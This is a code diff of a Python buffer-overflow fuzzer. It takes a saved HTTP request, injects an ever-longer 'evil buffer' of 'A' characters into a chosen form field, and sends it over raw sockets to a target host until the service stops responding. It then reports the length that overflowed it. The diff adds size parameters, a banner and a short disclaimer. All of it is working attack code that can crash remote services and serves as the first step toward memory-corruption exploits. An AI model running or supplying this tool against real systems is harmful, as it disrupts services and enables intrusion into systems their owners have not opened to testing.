@@ -3,18 +3,37 @@ import socket
 import time
 import sys
 
-if len(sys.argv) != 5:
-    print("\n Usage : " + sys.argv[0] + " <request file> <host ip> <port> <target form tag name>")
+if len(sys.argv) != 8:
+    print("\n Usage : " + sys.argv[0] + " <request file> <host ip> <port> <target form tag name> <start length> <step size> <end length>")
     sys.exit(1)
 
+print("================================")
+print("            Fuzzer")
+print("--------------------------------")
+print("    created by Xanthorrhizol")
+print(" (xanthorrhizol@protonmail.com)")
+print("================================")
+print("\nIt is a python script to find max buffer size.\n")
+print("\nIt can crash the target system.\nDON'T USE THIS FOR ATTACK OTHER SYSTEM.\nThe creater don't take responsability for other user's usage.\n\n")
+agree = input("Agree and start?[y/N]\t")
+if agree != "y" and agree != "Y":
+    sys.exit(0)
+print("---")
 host = sys.argv[2]
 port = int(sys.argv[3])
 targetform = sys.argv[4]
-size = 100
+startlen = int(sys.argv[5])
+step = int(sys.argv[6])
+endlen = int(sys.argv[7])
+size = startlen - 1
 
-while(size < 2000):
+while(size <= endlen):
     try:
-        print("\nsending evil buffer with " + str(size) + " bytes")
+        if size < startlen:
+            print("\nBorder case test")
+        else:
+            print()
+        print("Sending evil buffer with " + str(size) + " bytes")
         buffer = ""
         inputBuffer = "A" * size
         f = open(sys.argv[1], 'r')
@@ -31,11 +50,15 @@ while(size < 2000):
         buffer = buffer.replace("{to modify}", str(len(content)))
         #print(bytes(buffer, "utf-8")) # debug
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(10)
         s.connect((host, port))
         s.send(bytes(buffer, "utf-8"))
         s.close()
-        size += 100
-        time.sleep(10)
+        size += step
+        time.sleep(3)
     except:
-        print("\nERROR : Could not connect")
+        if size > startlen - 1:
+            print("\nSUCCESS : The buffer is overflowed by payload length "+ str(size))
+        else:
+            print("\nFAIL : Could not connect")
         sys.exit(1)
